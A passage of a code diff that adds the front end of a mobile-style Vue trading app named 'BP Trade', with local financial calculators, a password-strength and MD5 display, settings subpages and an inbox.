+                        <p class="text-sm" style="line-height: 1.6;">Diversification remains the cornerstone of resilient wealth accumulation. By spreading exposure across uncorrelated sectors, investors can cushion against sudden macroeconomic shifts.</p>
+                        <h3 style="font-size: 15px; font-weight: 700; margin-top: 8px;">2. Emotional Discipline</h3>
+                        <p class="text-sm" style="line-height: 1.6;">Market sentiment frequently overcorrects during periods of high turbulence. Maintaining predefined stop-loss limits and taking systematic profits prevents cognitive biases from dictating trade execution.</p>
+                    </div>
+                </div>
+            `,
+            setup() { return {}; }
+        };
+
+        // 6. Toolbox Component
+        const ToolboxPage = {
+            template: `
+                <div class="app-container">
+                    <div class="neu-card" style="padding: 20px;">
+                        <h1 style="font-size: 20px; font-weight: 700;">Financial Toolbox</h1>
+                        <p class="text-sm">Local high-precision financial utilities</p>
+                    </div>
+
+                    <div style="display: flex; flex-direction: column; gap: 16px;">
+                        <!-- Tool 1: DCA Profit-Taking Calculator -->
+                        <div class="neu-card flex flex-col gap-3">
+                            <h3 style="font-size: 15px; font-weight: 700;">DCA Profit-Taking Calculator</h3>
+                            <input type="number" class="neu-input" v-model.number="dca.cost" placeholder="Average Cost Price">
+                            <input type="number" class="neu-input" v-model.number="dca.shares" placeholder="Total Shares">
+                            <input type="number" class="neu-input" v-model.number="dca.target" placeholder="Target Profit % (e.g. 20)">
+                            <div class="neu-card-sm flex justify-between items-center" style="background: var(--bg-color);">
+                                <span class="text-sm">Target Exit Price:</span>
+                                <span style="font-weight: bold; color: var(--primary);">$\{{ dcaTargetPrice }}</span>
+                            </div>
+                        </div>
+
+                        <!-- Tool 2: Wealth Calendar & Reminder -->
+                        <div class="neu-card flex flex-col gap-3">
+                            <h3 style="font-size: 15px; font-weight: 700;">Wealth Calendar</h3>
+                            <input type="date" class="neu-input" v-model="cal.date">
+                            <input type="text" class="neu-input" v-model="cal.note" placeholder="Financial Milestone Note">
+                            <button class="neu-button" @click="saveCalendar">Save Milestone</button>
+                            <div v-if="cal.saved" class="text-sm text-green"> Milestone successfully recorded locally!</div>
+                        </div>
+
+                        <!-- Tool 3: Loan Calculator -->
+                        <div class="neu-card flex flex-col gap-3">
+                            <h3 style="font-size: 15px; font-weight: 700;">Loan Calculator</h3>
+                            <input type="number" class="neu-input" v-model.number="loan.amount" placeholder="Principal Amount">
+                            <input type="number" class="neu-input" v-model.number="loan.rate" placeholder="Annual Rate (%)">
+                            <input type="number" class="neu-input" v-model.number="loan.years" placeholder="Tenure (Years)">
+                            <div class="neu-card-sm flex justify-between items-center" style="background: var(--bg-color);">
+                                <span class="text-sm">Monthly Payment:</span>
+                                <span style="font-weight: bold; color: var(--primary);">$\{{ monthlyPayment }}</span>
+                            </div>
+                        </div>
+
+                        <!-- Tool 4: Profit Calculator -->
+                        <div class="neu-card flex flex-col gap-3">
+                            <h3 style="font-size: 15px; font-weight: 700;">Profit Calculator</h3>
+                            <input type="number" class="neu-input" v-model.number="prof.cost" placeholder="Unit Cost">
+                            <input type="number" class="neu-input" v-model.number="prof.price" placeholder="Selling Price">
+                            <input type="number" class="neu-input" v-model.number="prof.qty" placeholder="Quantity Sold">
+                            <div class="neu-card-sm flex justify-between items-center" style="background: var(--bg-color);">
+                                <span class="text-sm">Total Profit:</span>
+                                <span style="font-weight: bold; color: var(--accent-green);">$\{{ totalProfit }}</span>
+                            </div>
+                        </div>
+
+                        <!-- Tool 5: Reverse Yield Calculator -->
+                        <div class="neu-card flex flex-col gap-3">
+                            <h3 style="font-size: 15px; font-weight: 700;">Reverse Yield Calculator</h3>
+                            <input type="number" class="neu-input" v-model.number="rev.principal" placeholder="Initial Principal">
+                            <input type="number" class="neu-input" v-model.number="rev.target" placeholder="Target Amount">
+                            <input type="number" class="neu-input" v-model.number="rev.years" placeholder="Duration (Years)">
+                            <div class="neu-card-sm flex justify-between items-center" style="background: var(--bg-color);">
+                                <span class="text-sm">Required Annual Yield:</span>
+                                <span style="font-weight: bold; color: var(--primary);">{{ requiredYield }}%</span>
+                            </div>
+                        </div>
+
+                        <!-- Tool 6: Password Strength Detector (Calls md5) -->
+                        <div class="neu-card flex flex-col gap-3">
+                            <h3 style="font-size: 15px; font-weight: 700;">Password Strength & MD5</h3>
+                            <input type="password" class="neu-input" v-model="pwd.input" placeholder="Enter financial password">
+                            <div class="text-sm">Strength: <span :style="{color: pwdColor, fontWeight: 'bold'}">{{ pwdStrength }}</span></div>
+                            <div class="neu-card-sm" style="background: var(--bg-color); word-break: break-all; font-family: monospace; font-size: 11px;">
+                                MD5 Digest: {{ pwdMd5 }}
+                            </div>
+                        </div>
+
+                        <!-- Tool 7: Credit Memo & Countdown Reminder -->
+                        <div class="neu-card flex flex-col gap-3">
+                            <h3 style="font-size: 15px; font-weight: 700;">Credit Memo Reminder</h3>
+                            <input type="text" class="neu-input" v-model="credit.targetName" placeholder="Debtor Name">
+                            <input type="number" class="neu-input" v-model.number="credit.amount" placeholder="Amount">
+                            <input type="date" class="neu-input" v-model="credit.dueDate">
+                            <button class="neu-button" @click="saveCreditMemo">Add Credit Memo</button>
+                            <div v-for="(memo, idx) in creditList" :key="idx" class="neu-card-sm flex justify-between items-center" style="background: var(--bg-color);">
+                                <div>
+                                    <div style="font-weight: 600;">{{ memo.name }}: $\{{ memo.amount }}</div>
+                                    <div class="text-sm">Due: {{ memo.date }}</div>
+                                </div>
+                                <span class="badge badge-green">Active</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            `,
+            setup() {
+                // DCA state
+                const dca = reactive({ cost: 100, shares: 50, target: 20 });
+                const dcaTargetPrice = computed(() => {
+                    if (!dca.cost) return '0.00';
+                    return (dca.cost * (1 + (dca.target || 0) / 100)).toFixed(2);
+                });
+
+                // Wealth Calendar state
+                const cal = reactive({ date: '', note: '', saved: false });
+                const saveCalendar = () => {
+                    if (cal.date) {
+                        cal.saved = true;
+                        setTimeout(() => cal.saved = false, 2500);
+                    }
+                };
+
+                // Loan Calculator state
+                const loan = reactive({ amount: 100000, rate: 5, years: 30 });
+                const monthlyPayment = computed(() => {
+                    if (!loan.amount || !loan.rate || !loan.years) return '0.00';
+                    let r = loan.rate / 100 / 12;
+                    let n = loan.years * 12;
+                    let p = (loan.amount * r * Math.pow(1 + r, n)) / (Math.pow(1 + r, n) - 1);
+                    return isNaN(p) ? '0.00' : p.toFixed(2);
+                });
+
+                // Profit Calculator state
+                const prof = reactive({ cost: 50, price: 80, qty: 100 });
+                const totalProfit = computed(() => {
+                    let p = (prof.price - prof.cost) * prof.qty;
+                    return isNaN(p) ? '0.00' : p.toFixed(2);
+                });
+
+                // Reverse Yield state
+                const rev = reactive({ principal: 10000, target: 20000, years: 5 });
+                const requiredYield = computed(() => {
+                    if (!rev.principal || !rev.target || !rev.years) return '0.00';
+                    let y = (Math.pow(rev.target / rev.principal, 1 / rev.years) - 1) * 100;
+                    return isNaN(y) ? '0.00' : y.toFixed(2);
+                });
+
+                // Password Strength & MD5 state (Explicitly uses md5)
+                const pwd = reactive({ input: '' });
+                const pwdMd5 = computed(() => {
+                    if (!pwd.input) return 'N/A';
+                    return md5(pwd.input);
+                });
+                const pwdStrength = computed(() => {
+                    const val = pwd.input;
+                    if (!val) return 'Empty';
+                    if (val.length < 6) return 'Weak';
+                    if (val.length >= 8 && /[A-Z]/.test(val) && /[0-9]/.test(val)) return 'Strong';
+                    return 'Moderate';
+                });
+                const pwdColor = computed(() => {
+                    if (pwdStrength.value === 'Strong') return 'var(--accent-green)';
+                    if (pwdStrength.value === 'Weak') return 'var(--accent-red)';
+                    return '#f39c12';
+                });
+
+                // Credit Memo state
+                const credit = reactive({ targetName: '', amount: '', dueDate: '' });
+                const creditList = ref([
+                    { name: 'Alex Johnson', amount: 1200, date: '2026-11-15' }
+                ]);
+                const saveCreditMemo = () => {
+                    if (credit.targetName && credit.amount) {
+                        creditList.value.push({ name: credit.targetName, amount: credit.amount, date: credit.dueDate || '2026-12-01' });
+                        credit.targetName = '';
+                        credit.amount = '';
+                        credit.dueDate = '';
+                    }
+                };
+
+                return { dca, dcaTargetPrice, cal, saveCalendar, loan, monthlyPayment, prof, totalProfit, rev, requiredYield, pwd, pwdMd5, pwdStrength, pwdColor, credit, creditList, saveCreditMemo };
+            }
+        };
+
+        // 7. Settings Component
+        const SettingsPage = {
+            template: `
+                <div class="app-container">
+                    <div class="neu-card" style="padding: 20px;">
+                        <h1 style="font-size: 20px; font-weight: 700;">Settings & Profile</h1>
+                        <p class="text-sm">Manage preferences and security</p>
+                    </div>
+
+                    <div style="display: flex; flex-direction: column; gap: 12px;">
+                        <div class="neu-card flex justify-between items-center" style="cursor: pointer;" @click="goSub('checkin')">
+                            <div class="flex items-center gap-3">
+                                <div class="neu-icon-btn" style="width: 40px; height: 40px; color: var(--primary);">
+                                    <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor"><path d="M19 3h-1V1h-2v2H8V1H6v2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H5V8h14v11z"/></svg>
+                                </div>
+                                <span style="font-weight: 600;">Monthly Check-in</span>
+                            </div>
+                            <span class="text-sm">→</span>
+                        </div>
+
+                        <div class="neu-card flex justify-between items-center" style="cursor: pointer;" @click="goSub('version')">
+                            <div class="flex items-center gap-3">
+                                <div class="neu-icon-btn" style="width: 40px; height: 40px; color: var(--primary);">
+                                    <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
+                                </div>
+                                <span style="font-weight: 600;">Version Information</span>
+                            </div>
+                            <span class="text-sm">v2.4.0</span>
+                        </div>
+
+                        <div class="neu-card flex justify-between items-center" style="cursor: pointer;" @click="goSub('privacy')">
+                            <div class="flex items-center gap-3">
+                                <div class="neu-icon-btn" style="width: 40px; height: 40px; color: var(--primary);">
+                                    <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
+                                </div>
+                                <span style="font-weight: 600;">Privacy Policy</span>
+                            </div>
+                            <span class="text-sm">→</span>
+                        </div>
+
+                        <div class="neu-card flex justify-between items-center" style="cursor: pointer;" @click="goSub('terms')">
+                            <div class="flex items-center gap-3">
+                                <div class="neu-icon-btn" style="width: 40px; height: 40px; color: var(--primary);">
+                                    <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor"><path d="M14 2H6c-1.1 0-1.99.9-1.99 2L4 20c0 1.1.89 2 1.99 2H18c1.1 0 2-.9 2-2V8l-6-6zm2 16H8v-2h8v2zm0-4H8v-2h8v2zm-3-5V3.5L18.5 9H13z"/></svg>
+                                </div>
+                                <span style="font-weight: 600;">Terms of Service</span>
+                            </div>
+                            <span class="text-sm">→</span>
+                        </div>
+
+                        <div class="neu-card flex justify-between items-center" style="cursor: pointer;" @click="goSub('team')">
+                            <div class="flex items-center gap-3">
+                                <div class="neu-icon-btn" style="width: 40px; height: 40px; color: var(--primary);">
+                                    <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor"><path d="M16 11c1.66 0 2.99-1.34 2.99-3S17.66 5 16 5c-1.66 0-3 1.34-3 3s1.34 3 3 3zm-8 0c1.66 0 2.99-1.34 2.99-3S9.66 5 8 5C6.34 5 5 6.34 5 8s1.34 3 3 3zm0 2c-2.33 0-7 1.17-7 3.5V19h14v-2.5c0-2.33-4.67-3.5-7-3.5zm8 0c-.29 0-.62.02-.97.05 1.16.84 1.97 1.97 1.97 3.45V19h6v-2.5c0-2.33-4.67-3.5-7-3.5z"/></svg>
+                                </div>
+                                <span style="font-weight: 600;">About Team</span>
+                            </div>
+                            <span class="text-sm">→</span>
+                        </div>
+
+                        <a href="mailto:a.a.a4@gmail.com" class="neu-card flex justify-between items-center" style="text-decoration: none; color: inherit;">
+                            <div class="flex items-center gap-3">
+                                <div class="neu-icon-btn" style="width: 40px; height: 40px; color: var(--primary);">
+                                    <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor"><path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
+                                </div>
+                                <span style="font-weight: 600;">Contact Us</span>
+                            </div>
+                            <span class="text-sm">a.a.a4@gmail.com</span>
+                        </a>
+
+                        <div class="neu-card flex justify-between items-center" style="cursor: pointer;" @click="goSub('feedback')">
+                            <div class="flex items-center gap-3">
+                                <div class="neu-icon-btn" style="width: 40px; height: 40px; color: var(--primary);">
+                                    <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor"><path d="M20 2H4c-1.1 0-1.99.9-1.99 2L2 22l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zM6 9h12v2H6V9zm8 5H6v-2h8v2zm4-6H6V6h12v2z"/></svg>
+                                </div>
+                                <span style="font-weight: 600;">Customer Feedback</span>
+                            </div>
+                            <span class="text-sm">→</span>
+                        </div>
+                    </div>
+                </div>
+            `,
+            setup() {
+                const router = useRouter();
+                const goSub = (page) => {
+                    router.push('/settings/' + page);
+                };
+                return { goSub };
+            }
+        };
+
+        // Sub-pages for Settings
+        const CheckinPage = {
+            template: `
+                <div class="app-container">
+                    <div class="flex items-center justify-between">
+                        <button class="neu-icon-btn" @click="$router.back()">
+                            <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+                        </button>
+                        <h2 style="font-size: 16px; font-weight: 700;">Monthly Check-in</h2>
+                        <div style="width: 48px;"></div>
+                    </div>
+
+                    <div class="neu-card flex flex-col items-center gap-4" style="margin-top: 10px; text-align: center;">
+                        <h3 style="font-size: 18px; font-weight: bold;">October 2026 Check-in</h3>
+                        <p class="text-sm">Check in daily to earn reward points and platform privileges.</p>
+                        <button class="neu-button" @click="doCheckin" :style="checked ? 'color: var(--accent-green);' : ''">
+                            {{ checked ? 'Checked In Today ✓' : 'Click to Check In' }}
+                        </button>
+                    </div>
+                </div>
+            `,
+            setup() {
+                const checked = ref(false);
+                const doCheckin = () => {
+                    checked.value = true;
+                };
+                return { checked, doCheckin };
+            }
+        };
+
+        const VersionPage = {
+            template: `
+                <div class="app-container">
+                    <div class="flex items-center justify-between">
+                        <button class="neu-icon-btn" @click="$router.back()">
+                            <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+                        </button>
+                        <h2 style="font-size: 16px; font-weight: 700;">Version Information</h2>
+                        <div style="width: 48px;"></div>
+                    </div>
+                    <div class="neu-card flex flex-col items-center gap-4" style="margin-top: 20px; text-align: center;">
+                        <div class="neu-icon-btn" style="width: 64px; height: 64px; color: var(--primary);">
+                            <svg viewBox="0 0 24 24" width="32" height="32" fill="currentColor"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
+                        </div>
+                        <h3 style="font-size: 18px; font-weight: bold;">BP Trade v2.4.0</h3>
+                        <p class="text-sm">Production Release - Stable Build</p>
+                    </div>
+                </div>
+            `,
+            setup() { return {}; }
+        };
+
+        const PrivacyPage = {
+            template: `
+                <div class="app-container">
+                    <div class="flex items-center justify-between">
+                        <button class="neu-icon-btn" @click="$router.back()">
+                            <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+                        </button>
+                        <h2 style="font-size: 16px; font-weight: 700;">Privacy Policy</h2>
+                        <div style="width: 48px;"></div>
+                    </div>
+                    <div class="neu-card flex flex-col gap-3" style="margin-top: 10px;">
+                        <h3 style="font-size: 15px; font-weight: 700;">Data Protection & Security</h3>
+                        <p class="text-sm" style="line-height: 1.6;">We value your personal privacy. All local tools and financial calculators execute entirely within your client environment without transmitting sensitive inputs to external servers.</p>
+                        <h3 style="font-size: 15px; font-weight: 700;">Information Usage</h3>
+                        <p class="text-sm" style="line-height: 1.6;">Device fingerprinting is strictly utilized for secure handshake verification and anti-abuse protocols.</p>
+                    </div>
+                </div>
+            `,
+            setup() { return {}; }
+        };
+
+        const TermsPage = {
+            template: `
+                <div class="app-container">
+                    <div class="flex items-center justify-between">
+                        <button class="neu-icon-btn" @click="$router.back()">
+                            <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+                        </button>
+                        <h2 style="font-size: 16px; font-weight: 700;">Terms of Service</h2>
+                        <div style="width: 48px;"></div>
+                    </div>
+                    <div class="neu-card flex flex-col gap-3" style="margin-top: 10px;">
+                        <h3 style="font-size: 15px; font-weight: 700;">User Agreement</h3>
+                        <p class="text-sm" style="line-height: 1.6;">By accessing and using BP Trade, you agree to comply with all applicable financial regulations and operational guidelines.</p>
+                        <h3 style="font-size: 15px; font-weight: 700;">Disclaimer</h3>
+                        <p class="text-sm" style="line-height: 1.6;">Market data and local tool calculations are provided for informational purposes and should not be construed as formal financial advice.</p>
+                    </div>
+                </div>
+            `,
+            setup() { return {}; }
+        };
+
+        const TeamPage = {
+            template: `
+                <div class="app-container">
+                    <div class="flex items-center justify-between">
+                        <button class="neu-icon-btn" @click="$router.back()">
+                            <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+                        </button>
+                        <h2 style="font-size: 16px; font-weight: 700;">About Team</h2>
+                        <div style="width: 48px;"></div>
+                    </div>
+                    <div class="neu-card flex flex-col gap-3" style="margin-top: 10px;">
+                        <h3 style="font-size: 15px; font-weight: 700;">BP Trade Core Engineering</h3>
+                        <p class="text-sm" style="line-height: 1.6;">We are a dedicated team of senior mobile engineers, quantitative analysts, and UI architects dedicated to building ultra-fast, secure financial interfaces.</p>
+                    </div>
+                </div>
+            `,
+            setup() { return {}; }
+        };
+
+        const FeedbackPage = {
+            template: `
+                <div class="app-container">
+                    <div class="flex items-center justify-between">
+                        <button class="neu-icon-btn" @click="$router.back()">
+                            <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+                        </button>
+                        <h2 style="font-size: 16px; font-weight: 700;">Customer Feedback</h2>
+                        <div style="width: 48px;"></div>
+                    </div>
+                    <div class="neu-card flex flex-col gap-4" style="margin-top: 10px;">
+                        <input type="text" class="neu-input" v-model="title" placeholder="Feedback Subject">
+                        <textarea class="neu-input" v-model="content" placeholder="Describe your feedback or feature request..." style="height: 120px; resize: none;"></textarea>
+                        <button class="neu-button" :disabled="!isValid" :style="isValid ? 'color: var(--primary);' : 'opacity: 0.5; cursor: not-allowed;'" @click="submitFeedback">
+                            Send Feedback
+                        </button>
+                    </div>
+                    <div v-if="showToast" class="toast">Feedback sent successfully!</div>
+                </div>
+            `,
+            setup() {
+                const router = useRouter();
+                const title = ref('');
+                const content = ref('');
+                const showToast = ref(false);
+
+                const isValid = computed(() => title.value.trim() !== '' && content.value.trim() !== '');
+
+                const submitFeedback = () => {
+                    if (!isValid.value) return;
+                    showToast.value = true;
+                    setTimeout(() => {
+                        showToast.value = false;
+                        title.value = '';
+                        content.value = '';
+                        router.back();
+                    }, 1800);
+                };
+
+                return { title, content, isValid, showToast, submitFeedback };
+            }
+        };
+
+        // 8. Inbox Component
+        const InboxPage = {
+            template: `
+                <div class="app-container">
+                    <div class="flex items-center justify-between">
+                        <button class="neu-icon-btn" @click="$router.back()">
+                            <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+                        </button>
+                        <h2 style="font-size: 16px; font-weight: 700;">Inbox Messages</h2>
+                        <div style="width: 48px;"></div>
+                    </div>
+
+                    <div style="display: flex; flex-direction: column; gap: 12px; margin-top: 10px;">
+                        <div class="neu-card flex flex-col gap-2" style="cursor: pointer;" @click="openMsg">
+                            <div class="flex justify-between items-center">
+                                <span style="font-weight: 700;">Welcome to BP Trade</span>
+                                <span class="text-sm" style="font-size: 11px;">2026-10-22</span>
+                            </div>
+                            <p class="text-sm">Thank you for joining our financial platform. Explore real-time market indexes and advanced local tools.</p>
+                        </div>
+                    </div>
+
+                    <!-- Modal -->
+                    <div v-if="modalOpen" class="modal-overlay" @click.self="modalOpen = false">
+                        <div class="modal-content">
+                            <h3 style="font-size: 18px; font-weight: bold;">Welcome to BP Trade</h3>
+                            <p class="text-sm" style="line-height: 1.6;">Thank you for joining our financial platform. Explore real-time market indexes, advanced local tools, and secure asset tracking capabilities.</p>
+                            <button class="neu-button" @click="modalOpen = false">Close</button>
+                        </div>
+                    </div>
+                </div>
+            `,
+            setup() {
+                const modalOpen = ref(false);
+                const openMsg = () => { modalOpen.value = true; };
+                return { modalOpen, openMsg };
+            }
+        };
+
+        // Router configuration with hash history
+        const routes = [
+            { path: '/', component: LoadingPage },
+            { path: '/home', component: HomePage },
+            { path: '/detail', component: StockDetail },
+            { path: '/list/:type', component: StockListPage },
+            { path: '/article', component: ArticlePage },
+            { path: '/toolbox', component: ToolboxPage },
+            { path: '/settings', component: SettingsPage },
+            { path: '/settings/checkin', component: CheckinPage },
+            { path: '/settings/version', component: VersionPage },
+            { path: '/settings/privacy', component: PrivacyPage },
+            { path: '/settings/terms', component: TermsPage },
+            { path: '/settings/team', component: TeamPage },
+            { path: '/settings/feedback', component: FeedbackPage },
+            { path: '/inbox', component: InboxPage }
+        ];
+
+        const router = createRouter({
+            history: createWebHashHistory(),
+            routes
+        });
+
+        // App Root Instance
+        const App = {
+            setup() {
+                const route = useRoute();
+                // Show tab bar only on main tabs: /home, /toolbox, /settings
+                const showTabBar = computed(() => {
+                    const path = route.path;
+                    return path === '/home' || path === '/toolbox' || path === '/settings';
+                });
+                return { showTabBar };
+            }
+        };
+
+        const app = createApp(App);
+        app.use(router);
+        app.mount('#app');
+    </script>
+</body>
+</html>
